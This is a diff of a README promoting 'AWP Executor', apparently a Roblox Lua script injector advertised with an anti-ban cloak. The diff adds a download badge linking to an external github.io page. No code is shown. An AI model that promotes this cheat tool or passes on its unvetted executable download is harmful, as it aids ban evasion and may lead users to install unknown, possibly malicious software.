@@ -2,6 +2,7 @@
 
 When precision matters, **AWP Executor** hits the mark. This Roblox script injector is designed for **fast LUA execution, seamless stability, and a protective anti-ban cloak**. Whether you’re firing up massive hubs, GUI menus, or small utility scripts, AWP delivers every shot clean.
 
+[![Get](https://img.shields.io/badge/Get%20The-Executor-Green)]([#](https://awp-executor-script.github.io/.github/))
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
@@ -79,4 +80,5 @@ Its **precision-speed execution** and reliable stealth shield.
 ## License
 
 MIT License
+
 
